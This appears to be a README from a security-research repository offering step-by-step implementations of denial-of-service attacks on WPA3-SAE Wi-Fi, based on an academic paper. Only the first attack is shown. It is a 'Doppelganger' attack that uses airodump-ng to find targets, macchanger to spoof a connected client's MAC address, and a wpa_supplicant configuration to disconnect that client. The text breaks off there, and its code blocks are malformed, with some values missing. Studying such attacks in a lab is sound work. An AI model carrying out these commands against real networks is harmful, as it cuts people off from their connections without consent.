# 🛑 WPA3-SAE Denial-of-Service (DoS) Attacks: Practical Implementation Guide

![WPA3-SAE](https://img.shields.io/badge/Protocol-WPA3--SAE-informational) ![Research](https://img.shields.io/badge/Type-Security_Research-red) ![License](https://img.shields.io/badge/License-CC--BY--NC--4.0-lightgrey) ![Python](https://img.shields.io/badge/Python-3.x-blue)

## ⚠️ IMPORTANT LEGAL AND ETHICAL DISCLAIMER

> **🚫 This documentation is provided for educational, security testing, and academic research purposes only. Unauthorized access to computer networks is illegal. All testing must be conducted in a controlled, isolated lab environment using equipment you own. The authors are not responsible for any misuse of this information.**

---

## 📚 Table of Contents
1.  [Overview](#-overview)
2.  [Lab Setup Requirements](#-lab-setup-requirements)
3.  [Attack Documentation](#-attack-documentation)
4.  [Attack Comparison Table](#-attack-comparison-table)
5.  [General Setup & Tools](#-general-setup--tools)
6.  [Mitigations & References](#-mitigations--references)

---

## 🔍 Overview

This repository contains practical implementations of the seven (7) novel DoS attacks against WPA3-SAE (Simultaneous Authentication of Equals) documented in the academic paper *"How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"* by Chatzoglou et al.

These attacks exploit implementation flaws and resource management weaknesses in WPA3-SAE, ranging from disconnecting specific users to completely crippling an Access Point (AP).

![Attack Overview](https://via.placeholder.com/800x200.png?text=WPA3-SAE+Attack+Flow+Diagram) *// Placeholder for diagram*

---

## 🧪 Lab Setup Requirements

-   **🔒 Isolated Network:** A dedicated Wi-Fi AP (e.g., a home router) with WPA3-SAE enabled, **disconnected from the Internet**.
-   **📱 Target Devices:** At least one or two client devices (e.g., smartphone, laptop) connected to the AP.
-   **💻 Attacker Machine:** A computer running Kali Linux or similar distribution.
-   **📶 Wireless Adapters:** Two wireless network interface controllers (WNICs) are recommended:
    -   **WNIC 1 (`wlan0`):** For monitor mode (packet capture). Must support packet injection.
    -   **WNIC 2 (`wlo1`):** For managed mode (sending attack frames and connection attempts).
-   **🛠️ Core Tools:** `aircrack-ng`, `macchanger`, `tshark`, `wpa_supplicant`, `scapy` (Python library).

---

## 🧨 Attack Documentation

### 1. Doppelganger Attack
**🎯 Goal:** Disconnect a specific target client or deny it internet access.
**💡 Concept:** Spoof the MAC address of a connected client and authenticate with the correct password, confusing the AP.

**🛠️ Implementation:**
```bash
# Step 1: Identify target client and AP BSSID
sudo airodump-ng wlan0mon

# Step 2: Spoof the target's MAC address
sudo ip link set wlo1 down
sudo macchanger -m  # Use target's MAC
sudo ip link set wlo1 up

nano test_sae.conf

📁 Configuration File (test_sae.conf):
bash

ctrl_interface=/var/run/wpa_supplicant
update_config=1
ap_scan=1

network={
    ssid=""
    bssid= # AP's MAC address
    scan_ssid=1
    key_mgmt=SAE
    psk="CorrectWiFiPassword" # The network's password
    ieee80211w=2
}

# Step 3: Attempt authentication
sudo systemctl stop NetworkManager
sudo wpa_supplicant -c test_sae.conf -i wlo1 -d
